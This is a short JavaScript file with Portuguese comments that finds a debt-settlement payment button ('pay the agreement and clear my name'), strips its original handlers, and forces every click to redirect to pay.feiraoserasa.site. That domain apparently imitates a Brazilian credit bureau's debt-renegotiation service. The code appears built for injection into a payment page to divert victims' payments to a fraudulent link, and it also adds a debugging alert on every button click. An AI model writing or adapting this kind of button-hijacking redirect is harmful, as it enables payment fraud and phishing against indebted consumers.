const SAFE_URL = "https://pay.feiraoserasa.site/lDW0ZaJnv64GN7E";
const BUTTON_TEXT = "REALIZAR PAGAMENTO DO ACORDO E LIMPAR MEU NOME";

// ============================
// ALERTA GLOBAL PARA QUALQUER BOTÃO
// ============================
document.addEventListener("click", function(e) {
  const btn = e.target.closest("button");

  if (btn) {
    const name = btn.textContent.trim() || "[sem texto]";
    alert("Botão clicado: " + name);
  }
}, true);

// ============================
// INTERCEPTAÇÃO DO BOTÃO ALVO
// ============================
function waitForButton() {
  const btn = [...document.querySelectorAll("button")]
    .find(b => b.textContent.trim() === BUTTON_TEXT);

  if (btn) overrideButton(btn);
  else requestAnimationFrame(waitForButton);
}
waitForButton();

function overrideButton(btn) {
  // Remove listeners ocultos recriando o botão
  const clone = btn.cloneNode(true);
  btn.replaceWith(clone);
  const cleanBtn = [...document.querySelectorAll("button")]
    .find(b => b.textContent.trim() === BUTTON_TEXT);

  // Remove qualquer comportamento original
  ["onclick", "data-action", "data-trigger", "data-url"].forEach(attr => cleanBtn.removeAttribute(attr));
  cleanBtn.onclick = null;

  // Substitui comportamento por seu redirecionamento
  cleanBtn.addEventListener("click", function(e) {
    e.preventDefault();
    e.stopImmediatePropagation();
    window.location.href = SAFE_URL;
  }, true);

  console.log("[OK] Botão interceptado e redirecionando para o link correto.");
}
